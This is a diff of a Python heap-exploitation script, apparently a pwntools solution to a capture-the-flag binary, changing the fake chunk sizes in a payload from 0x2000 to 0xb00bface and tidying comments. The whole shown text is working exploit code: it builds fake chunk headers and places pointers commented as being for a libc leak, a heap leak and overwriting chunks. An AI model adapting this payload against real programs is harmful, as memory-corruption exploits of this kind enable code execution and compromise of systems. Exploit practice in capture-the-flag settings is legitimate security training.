@@ -40,12 +40,12 @@ def exploit(r):
     
     addChunk(0x21, "B")
     addChunk(0x31, "C") 
-    addChunk(0x28, p64(0x2000)*5)
+    addChunk(0x28, p64(0xb00bface)*5) # fake sizes
     
-    payload  = p64(0x2000)*14
-    payload += p64(0x602020) # for libc leak
-    payload += p64(0x602050) # for heap leak
-    payload += p64(0x602100) # for easy access to overwrite chunks
+    payload  = p64(0xb00bface)*14     # fake sizes
+    payload += p64(0x602020)          # for libc leak
+    payload += p64(0x602050)          # for heap leak
+    payload += p64(0x602100)          # for easy access to overwrite chunks
     
     editChunk(2,payload)
 
